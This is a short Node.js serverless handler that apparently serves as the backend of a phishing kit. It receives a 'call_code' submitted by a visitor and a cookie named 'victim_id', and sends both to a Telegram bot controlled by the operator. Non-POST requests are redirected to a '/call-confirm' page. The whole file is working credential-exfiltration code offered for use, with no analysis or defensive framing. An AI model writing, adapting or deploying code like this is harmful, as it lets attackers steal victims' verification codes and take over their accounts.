const fetch = require('node-fetch');

const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const CHAT_ID = process.env.TELEGRAM_CHAT_ID;

async function sendTelegram(message) {
  if (!BOT_TOKEN || !CHAT_ID) {
    console.log('[TELEGRAM NOT CONFIGURED] Would send:', message);
    return;
  }
  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
  try {
    await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: message,
        parse_mode: 'HTML'
      })
    });
    console.log('Telegram message sent');
  } catch (err) {
    console.error('Telegram error:', err);
  }
}

exports.handler = async (event, context) => {
  if (event.httpMethod !== 'POST') {
    return { statusCode: 302, headers: { 'Location': '/call-confirm' }, body: '' };
  }

  try {
    const params = new URLSearchParams(event.body);
    const call_code = params.get('call_code');
    const vId = event.headers.cookie?.match(/victim_id=([^;]+)/)?.[1] || 'unknown';

    await sendTelegram(`<b>📞 Call Code</b>\n<b>Code:</b> <code>${call_code}</code>\n<b>ID:</b> <code>${vId}</code>`);

    return {
      statusCode: 200,
      headers: { 'Content-Type': 'text/plain' },
      body: 'OK'
    };
  } catch (error) {
    console.error('Error:', error);
    return { statusCode: 500, body: 'Internal Server Error' };
  }
};
